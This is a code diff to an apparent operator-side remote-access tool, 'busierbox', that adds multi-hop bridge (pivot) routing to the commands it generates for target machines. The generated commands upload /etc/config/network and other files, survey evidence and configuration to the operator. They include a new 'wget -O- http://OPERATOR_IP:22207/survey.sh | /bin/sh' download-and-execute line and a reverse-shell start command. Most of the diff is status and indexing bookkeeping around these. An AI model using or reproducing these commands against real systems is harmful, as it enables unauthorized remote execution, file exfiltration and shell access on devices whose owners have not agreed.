@@ -1294,6 +1294,7 @@ def server_state_record(cfg):
 def enriched_staged_records(cfg, staged=None):
     staged = staged if staged is not None else load_staged(cfg).get("staged", {})
     host = (local_ips() or ["OPERATOR_IP"])[0]
+    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
     out = {}
     for name, rec in sorted((staged or {}).items()):
         if not isinstance(rec, dict):
@@ -1305,6 +1306,10 @@ def enriched_staged_records(cfg, staged=None):
         item["stage_kind"] = str(item.get("stage_kind") or "file")
         item["fetch_command"] = render_fetch_command(request, cfg, host=host)
         item["fetch_command_force"] = render_fetch_command(request, cfg, host=host, force=True)
+        item["target_route"] = dict(route)
+        item["route_kind"] = route.get("route_kind", "direct")
+        item["bridge_profile"] = route.get("bridge_profile", "")
+        item["bridge_route_path"] = route.get("bridge_route_path", "")
         item["source_exists"] = Path(str(source_path)).is_file() if source_path else False
         item["source_path"] = str(source_path)
         out[name] = item
@@ -2085,6 +2090,78 @@ def bridge_route_path(rec):
         if path:
             return " -> ".join(path)
     return f"operator:{rec.get('listen_port', '')} -> {rec.get('dest_host', '')}:{rec.get('dest_port', '')}"
+
+
+def parse_endpoint_host_port(endpoint):
+    text = str(endpoint or "").strip()
+    if not text:
+        return "", 0
+    if text.startswith("[") and "]:" in text:
+        host, port = text[1:].split("]:", 1)
+    elif ":" in text:
+        host, port = text.rsplit(":", 1)
+    else:
+        return text, 0
+    try:
+        return host.strip(), int(port)
+    except (TypeError, ValueError):
+        return host.strip(), 0
+
+
+def target_visible_host(host, cfg, fallback_host=None):
+    text = str(host or "").strip()
+    if text and text.lower() not in ("operator", "localhost", "0.0.0.0", "::"):
+        return text
+    fallback = str(cfg.get("operator_server_host") or fallback_host or cfg.get("listen_host") or "").strip()
+    if fallback and fallback not in ("0.0.0.0", "::"):
+        return fallback
+    candidates = local_ips()
+    return candidates[0] if candidates else "OPERATOR_IP"
+
+
+def selected_bridge_profile_record(cfg):
+    name = str(cfg.get("bridge_profile") or "").strip()
+    if not name:
+        return {}
+    profiles = load_bridge_profiles(cfg).get("profiles") or {}
+    rec = profiles.get(name)
+    if not isinstance(rec, dict):
+        return {}
+    return bridge_profile_record(cfg, name, rec)
+
+
+def target_route_context(cfg, service, direct_host=None, direct_port=None):
+    direct_port = int(direct_port or 0)
+    direct = {
+        "route_kind": "direct",
+        "service": str(service or ""),
+        "host": target_visible_host(direct_host, cfg),
+        "port": direct_port,
+        "bridge_profile": "",
+        "bridge_route_path": "",
+        "bridge_hop_count": 0,
+        "bridge_multi_hop": False,
+        "requires_bridge": False,
+    }
+    profile = selected_bridge_profile_record(cfg)
+    if not profile:
+        return direct
+    hops = profile.get("hops") if isinstance(profile.get("hops"), list) else []
+    first = hops[0] if hops and isinstance(hops[0], dict) else {}
+    endpoint_host, endpoint_port = parse_endpoint_host_port(first.get("from") or "")
+    if not endpoint_port:
+        endpoint_port = int(profile.get("listen_port") or direct_port or 0)
+    direct.update({
+        "route_kind": "bridge",
+        "host": target_visible_host(endpoint_host, cfg, fallback_host=direct_host),
+        "port": endpoint_port,
+        "bridge_profile": str(profile.get("name") or ""),
+        "bridge_route_path": str(profile.get("route_path") or ""),
+        "bridge_hop_count": int(profile.get("hop_count") or 0),
+        "bridge_multi_hop": bool(profile.get("multi_hop")),
+        "requires_bridge": True,
+    })
+    return direct
 
 
 def bridge_profile_record(cfg, name, rec, service_state=None):
@@ -4421,6 +4498,9 @@ def target_command_record_indexes(records):
     by_service_purpose = {}
     by_side_purpose = {}
     by_network = records_by_key(records, "network")
+    by_route_kind = records_by_key(records, "route_kind")
+    by_bridge_profile = records_by_key(records, "bridge_profile")
+    by_requires_bridge = records_by_key(records, "requires_bridge")
     by_requires_explicit_target_action = records_by_key(records, "requires_explicit_target_action")
     by_executes_operator_supplied_commands = records_by_key(records, "executes_operator_supplied_commands")
     by_ordinal = {}
@@ -4480,6 +4560,7 @@ def target_command_record_indexes(records):
     return (
         by_service, by_target_id, by_request_name, by_stage_kind, by_release_path, by_side,
         by_purpose, by_service_purpose, by_side_purpose, by_network,
+        by_route_kind, by_bridge_profile, by_requires_bridge,
         by_requires_explicit_target_action, by_executes_operator_supplied_commands,
         by_ordinal, by_command_sha256, by_copy_supported,
         by_session_policy, by_session_policy_valid, by_retry_backoff,
@@ -4499,6 +4580,8 @@ def target_command_record_summary(records):
     by_release_path = {}
     by_side = {}
     by_purpose = {}
+    by_route_kind = {}
+    by_bridge_profile = {}
     by_session_policy = {}
     by_session_policy_valid = {}
     by_retry_backoff = {}
@@ -4514,6 +4597,8 @@ def target_command_record_summary(records):
         release_path = str(rec.get("release_path") or "")
         side = str(rec.get("side") or "")
         purpose = str(rec.get("purpose") or "")
+        route_kind = str(rec.get("route_kind") or "")
+        bridge_profile = str(rec.get("bridge_profile") or "")
         metadata = rec.get("metadata") if isinstance(rec.get("metadata"), dict) else {}
         retry = metadata.get("retry") if isinstance(metadata.get("retry"), dict) else {}
         if service:
@@ -4528,6 +4613,10 @@ def target_command_record_summary(records):
             by_side[side] = by_side.get(side, 0) + 1
         if purpose:
             by_purpose[purpose] = by_purpose.get(purpose, 0) + 1
+        if route_kind:
+            by_route_kind[route_kind] = by_route_kind.get(route_kind, 0) + 1
+        if bridge_profile:
+            by_bridge_profile[bridge_profile] = by_bridge_profile.get(bridge_profile, 0) + 1
         if metadata.get("session_policy") not in (None, ""):
             key = str(metadata.get("session_policy"))
             by_session_policy[key] = by_session_policy.get(key, 0) + 1
@@ -4563,6 +4652,8 @@ def target_command_record_summary(records):
         "by_release_path": by_release_path,
         "by_side": by_side,
         "by_purpose": by_purpose,
+        "by_route_kind": by_route_kind,
+        "by_bridge_profile": by_bridge_profile,
         "by_session_policy": by_session_policy,
         "by_session_policy_valid": by_session_policy_valid,
         "session_policy_error_count": session_policy_error_count,
@@ -5743,7 +5834,11 @@ def update_server_state(cfg, action, status="configured", extra=None):
         "state_file": str(state_file_path(cfg)),
         "updated_at": utc_now(),
     }
-    for key in ("managed_by", "process_log", "session_log", "staged_file", "workbench_mode"):
+    for key in (
+        "managed_by", "process_log", "session_log", "staged_file", "workbench_mode",
+        "url", "target_command", "target_route", "route_kind", "route_host",
+        "route_port", "bridge_profile", "bridge_route_path", "requires_bridge",
+    ):
         if previous.get(key):
             service[key] = previous[key]
     if cfg.get("_managed_by"):
@@ -6624,15 +6719,16 @@ def stage_release_selection(cfg, selector):
 def render_fetch_command(request_name, cfg, host=None, force=False):
     candidates = local_ips()
     host = host or (candidates[0] if candidates else "OPERATOR_IP")
+    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
     target_ctx = selected_target_context(cfg)
     cmd = [
         "busierbox",
         "fetch",
         request_name,
         "--host",
-        host,
+        str(route.get("host") or host),
         "--port",
-        str(cfg.get("file_service_port", 22204)),
+        str(route.get("port") or cfg.get("file_service_port", 22204)),
     ]
     if not yes(cfg.get("file_service_tls", "yes")):
         cmd.append("--no-tls")
@@ -6650,14 +6746,15 @@ def render_fetch_command(request_name, cfg, host=None, force=False):
 def render_file_service_command(parts, cfg, host=None):
     candidates = local_ips()
     host = host or (candidates[0] if candidates else "OPERATOR_IP")
+    route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
     target_ctx = selected_target_context(cfg)
     cmd = [
         "./busierbox",
         *parts,
         "--host",
-        host,
+        str(route.get("host") or host),
         "--port",
-        str(cfg.get("file_service_port", 22204)),
+        str(route.get("port") or cfg.get("file_service_port", 22204)),
     ]
     if not yes(cfg.get("file_service_tls", "yes")):
         cmd.append("--no-tls")
@@ -6668,6 +6765,35 @@ def render_file_service_command(parts, cfg, host=None):
     for alias in target_ctx.get("target_aliases") or []:
         cmd.extend(["--target-alias", alias])
     return " ".join(shquote(part) for part in cmd)
+
+
+def survey_bootstrap_route_context(cfg, host=None, port=None):
+    candidates = local_ips()
+    direct_host = host or str(cfg.get("operator_server_host") or "") or (candidates[0] if candidates else "OPERATOR_IP")
+    direct_port = port or cfg.get("survey_bootstrap_port", 22207)
+    return target_route_context(cfg, "survey-bootstrap", direct_host=direct_host, direct_port=direct_port)
+
+
+def render_survey_bootstrap_command(cfg, host=None, port=None):
+    script_name = str(cfg.get("survey_bootstrap_name", "survey.sh")).lstrip("/") or "survey.sh"
+    route = survey_bootstrap_route_context(cfg, host=host, port=port)
+    url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
+    return f"wget -O- {shquote(url)} | /bin/sh"
+
+
+def attach_target_route_fields(record, route):
+    rec = dict(record)
+    route_doc = dict(route or {})
+    rec["target_route"] = route_doc
+    rec["route_kind"] = str(route_doc.get("route_kind") or "direct")
+    rec["route_host"] = str(route_doc.get("host") or "")
+    rec["route_port"] = int(route_doc.get("port") or 0)
+    rec["bridge_profile"] = str(route_doc.get("bridge_profile") or "")
+    rec["bridge_route_path"] = str(route_doc.get("bridge_route_path") or "")
+    rec["bridge_hop_count"] = int(route_doc.get("bridge_hop_count") or 0)
+    rec["bridge_multi_hop"] = bool(route_doc.get("bridge_multi_hop"))
+    rec["requires_bridge"] = bool(route_doc.get("requires_bridge"))
+    return rec
 
 
 def print_staged(cfg):
@@ -9092,13 +9218,33 @@ def serve_survey_bootstrap(cfg, timeout, max_sessions=0):
     if host in ("0.0.0.0", "::"):
         host = "127.0.0.1"
     script_name = str(cfg.get("survey_bootstrap_name", "survey.sh")).lstrip("/") or "survey.sh"
-    script_text = survey_bootstrap_script(cfg, host, port)
+    route = survey_bootstrap_route_context(cfg, host=host, port=port)
+    route_host = str(route.get("host") or host)
+    route_port = int(route.get("port") or port)
+    target_command = render_survey_bootstrap_command(cfg, host=host, port=port)
+    script_text = survey_bootstrap_script(cfg, route_host, route_port)
     log_dir = session_log_dir(cfg, service)
-    start_session_record(cfg, service, log_dir, details={"port": port, "script_name": script_name})
+    session_details = {
+        "port": port,
+        "script_name": script_name,
+        "url": f"http://{route_host}:{route_port}/{script_name}",
+        "target_command": target_command,
+        "target_route": dict(route),
+        "route_kind": route.get("route_kind", "direct"),
+        "route_host": route_host,
+        "route_port": route_port,
+        "bridge_profile": route.get("bridge_profile", ""),
+        "bridge_route_path": route.get("bridge_route_path", ""),
+        "requires_bridge": bool(route.get("requires_bridge")),
+    }
+    start_session_record(cfg, service, log_dir, details=session_details)
     (log_dir / script_name).write_text(script_text, encoding="utf-8")
     (log_dir / "config.json").write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")
     print(f"Survey bootstrap listener. Listening on http://{host}:{port}/{script_name}")
-    update_server_state(cfg, service, "starting", {"session_log": str(log_dir), "script_name": script_name, "url": f"http://{host}:{port}/{script_name}"})
+    if route.get("route_kind") == "bridge":
+        print(f"Survey bootstrap route: bridge profile {route.get('bridge_profile', '')} {route.get('bridge_route_path', '')}")
+    print(f"Target command: {target_command}")
+    update_server_state(cfg, service, "starting", {"session_log": str(log_dir), **session_details})
     sessions = 0
     sock = None
     bound = False
@@ -9106,8 +9252,8 @@ def serve_survey_bootstrap(cfg, timeout, max_sessions=0):
         sock = bind_listen_socket(cfg, service, port, 20)
         bound = True
         sock.settimeout(timeout)
-        update_server_state(cfg, service, "listening", {"session_log": str(log_dir), "script_name": script_name, "url": f"http://{host}:{port}/{script_name}"})
-        append_event(cfg, service, "service_start", session=str(log_dir), details={"port": port, "script_name": script_name, "url": f"http://{host}:{port}/{script_name}"})
+        update_server_state(cfg, service, "listening", {"session_log": str(log_dir), **session_details})
+        append_event(cfg, service, "service_start", session=str(log_dir), details=session_details)
         print_candidates(cfg, port)
         while not SHUTDOWN.is_set():
             print("Waiting for survey bootstrap request...")
@@ -9553,7 +9699,7 @@ def service_status_rows(cfg):
         stale = bool(rec.get("status") == "listening" and not info["listening"])
         session_log = str(rec.get("session_log", "") or "")
         process_log = str(rec.get("process_log", "") or "")
-        rows.append({
+        row = {
             "name": name,
             "port": info["port"],
             "bind_address": rec.get("listen_host") or info.get("bind_address") or str(cfg.get("listen_host", "")),
@@ -9579,7 +9725,14 @@ def service_status_rows(cfg):
             "process_log": process_log,
             "process_log_exists": Path(process_log).exists() if process_log else False,
             "listener_bind_mismatch": bool(info.get("listener_endpoints")) and not bool(info.get("matching_listener_endpoints")),
-        })
+        }
+        for key in (
+            "url", "target_command", "target_route", "route_kind", "route_host",
+            "route_port", "bridge_profile", "bridge_route_path", "requires_bridge",
+        ):
+            if rec.get(key) not in (None, ""):
+                row[key] = rec.get(key)
+        rows.append(row)
     return rows
 
 
@@ -10286,6 +10439,9 @@ def status_document(cfg):
      target_commands_by_service_purpose,
      target_commands_by_side_purpose,
      target_commands_by_network,
+     target_commands_by_route_kind,
+     target_commands_by_bridge_profile,
+     target_commands_by_requires_bridge,
      target_commands_by_requires_explicit_target_action,
      target_commands_by_executes_operator_supplied_commands,
      target_commands_by_ordinal,
@@ -10656,6 +10812,15 @@ def status_document(cfg):
             "process_log_exists": row.get("process_log_exists", False),
             "session_log": row.get("session_log", ""),
             "session_log_exists": row.get("session_log_exists", False),
+            "url": row.get("url", ""),
+            "target_command": row.get("target_command", ""),
+            "target_route": row.get("target_route") or {},
+            "route_kind": row.get("route_kind", ""),
+            "route_host": row.get("route_host", ""),
+            "route_port": row.get("route_port", ""),
+            "bridge_profile": row.get("bridge_profile", ""),
+            "bridge_route_path": row.get("bridge_route_path", ""),
+            "requires_bridge": bool(row.get("requires_bridge", False)),
         }
         for row in services
     }
@@ -11043,6 +11208,8 @@ def status_document(cfg):
         "target_command_target_counts": target_command_summary.get("by_target_id") or {},
         "target_command_side_counts": target_command_summary.get("by_side") or {},
         "target_command_purpose_counts": target_command_summary.get("by_purpose") or {},
+        "target_command_route_kind_counts": target_command_summary.get("by_route_kind") or {},
+        "target_command_bridge_profile_counts": target_command_summary.get("by_bridge_profile") or {},
         "target_command_stage_kind_counts": target_command_summary.get("by_stage_kind") or {},
         "target_command_release_path_counts": target_command_summary.get("by_release_path") or {},
         "target_command_session_policy_counts": target_command_summary.get("by_session_policy") or {},
@@ -11437,7 +11604,9 @@ def status_document(cfg):
                 "target_commands_by_stage_kind", "target_commands_by_release_path",
                 "target_commands_by_side", "target_commands_by_purpose",
                 "target_commands_by_service_purpose", "target_commands_by_side_purpose",
-                "target_commands_by_network", "target_commands_by_requires_explicit_target_action",
+                "target_commands_by_network", "target_commands_by_route_kind",
+                "target_commands_by_bridge_profile", "target_commands_by_requires_bridge",
+                "target_commands_by_requires_explicit_target_action",
                 "target_commands_by_executes_operator_supplied_commands",
                 "target_commands_by_ordinal", "target_commands_by_command_sha256",
                 "target_commands_by_copy_supported",
@@ -12043,6 +12212,9 @@ def status_document(cfg):
         "target_commands_by_service_purpose": target_commands_by_service_purpose,
         "target_commands_by_side_purpose": target_commands_by_side_purpose,
         "target_commands_by_network": target_commands_by_network,
+        "target_commands_by_route_kind": target_commands_by_route_kind,
+        "target_commands_by_bridge_profile": target_commands_by_bridge_profile,
+        "target_commands_by_requires_bridge": target_commands_by_requires_bridge,
         "target_commands_by_requires_explicit_target_action": target_commands_by_requires_explicit_target_action,
         "target_commands_by_executes_operator_supplied_commands": target_commands_by_executes_operator_supplied_commands,
         "target_commands_by_ordinal": target_commands_by_ordinal,
@@ -12805,8 +12977,10 @@ def rshell_session_policy_record(cfg):
 def generated_target_command_records(cfg, staged=None):
     staged = staged if staged is not None else load_staged(cfg).get("staged", {})
     host = (local_ips() or ["OPERATOR_IP"])[0]
+    file_route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
+    survey_route = survey_bootstrap_route_context(cfg, host=host, port=cfg.get("survey_bootstrap_port", 22207))
     records = [
-        {
+        attach_target_route_fields({
             "command": render_file_service_command(["put", "/etc/config/network"], cfg, host=host),
             "purpose": "explicitly upload a target file to the operator file service",
             "side": "target",
@@ -12814,8 +12988,8 @@ def generated_target_command_records(cfg, staged=None):
             "network": True,
             "requires_explicit_target_action": True,
             "executes_operator_supplied_commands": False,
-        },
-        {
+        }, file_route),
+        attach_target_route_fields({
             "command": render_file_service_command(["survey", "push"], cfg, host=host),
             "purpose": "explicitly upload passive target survey evidence",
             "side": "target",
@@ -12823,8 +12997,8 @@ def generated_target_command_records(cfg, staged=None):
             "network": True,
             "requires_explicit_target_action": True,
             "executes_operator_supplied_commands": False,
-        },
-        {
+        }, file_route),
+        attach_target_route_fields({
             "command": render_file_service_command(["reality-test", "push"], cfg, host=host),
             "purpose": "explicitly upload active target capability evidence",
             "side": "target",
@@ -12832,8 +13006,8 @@ def generated_target_command_records(cfg, staged=None):
             "network": True,
             "requires_explicit_target_action": True,
             "executes_operator_supplied_commands": False,
-        },
-        {
+        }, file_route),
+        attach_target_route_fields({
             "command": render_file_service_command(["manifest", "push"], cfg, host=host),
             "purpose": "explicitly upload runtime manifest metadata",
             "side": "target",
@@ -12841,8 +13015,8 @@ def generated_target_command_records(cfg, staged=None):
             "network": True,
             "requires_explicit_target_action": True,
             "executes_operator_supplied_commands": False,
-        },
-        {
+        }, file_route),
+        attach_target_route_fields({
             "command": render_file_service_command(["config-push"], cfg, host=host),
             "purpose": "explicitly upload effective runtime configuration",
             "side": "target",
@@ -12850,8 +13024,8 @@ def generated_target_command_records(cfg, staged=None):
             "network": True,
             "requires_explicit_target_action": True,
             "executes_operator_supplied_commands": False,
-        },
-        {
+        }, file_route),
+        attach_target_route_fields({
             "command": render_file_service_command(["evidence", "push"], cfg, host=host),
             "purpose": "explicitly upload an evidence bundle",
             "side": "target",
@@ -12859,7 +13033,16 @@ def generated_target_command_records(cfg, staged=None):
             "network": True,
             "requires_explicit_target_action": True,
             "executes_operator_supplied_commands": False,
-        },
+        }, file_route),
+        attach_target_route_fields({
+            "command": render_survey_bootstrap_command(cfg, host=host, port=cfg.get("survey_bootstrap_port", 22207)),
+            "purpose": "download and run the architecture-agnostic survey bootstrap script",
+            "side": "target",
+            "service": "survey-bootstrap",
+            "network": True,
+            "requires_explicit_target_action": True,
+            "executes_operator_supplied_commands": False,
+        }, survey_route),
         {
             "command": "./busierbox rshell start",
             "purpose": "start the configured reverse shell transport from the target",
@@ -12873,7 +13056,7 @@ def generated_target_command_records(cfg, staged=None):
     ]
     for name in sorted(staged):
         rec = staged.get(name) if isinstance(staged, dict) else {}
-        record = {
+        record = attach_target_route_fields({
             "command": render_fetch_command(name, cfg, host=host),
             "purpose": "explicitly fetch an operator-staged file",
             "side": "target",
@@ -12886,7 +13069,7 @@ def generated_target_command_records(cfg, staged=None):
             "source_sha256": str((rec or {}).get("sha256", "")) if isinstance(rec, dict) else "",
             "source_size": (rec or {}).get("size", "") if isinstance(rec, dict) else "",
             "stage_kind": str((rec or {}).get("stage_kind") or "file") if isinstance(rec, dict) else "file",
-        }
+        }, file_route)
         if isinstance(rec, dict):
             for key in (
                 "target_id", "target_label", "target_identity_source",
